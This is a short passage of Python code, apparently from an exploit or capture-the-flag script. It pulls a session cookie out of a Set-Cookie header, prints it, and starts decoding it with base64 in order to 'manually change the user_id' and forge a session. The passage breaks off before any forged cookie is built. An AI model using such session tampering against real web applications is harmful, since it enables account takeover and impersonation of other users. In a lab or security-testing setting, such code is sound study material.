session_match = re.search(r'session=([^;]+)', set_cookie)
if session_match:
    original_cookie = session_match.group(1)
    print(f"[+] Original session: {original_cookie}")

    # Try to manually change the user_id in the session
    import base64
    try:
        parts = original_cookie.split('.')
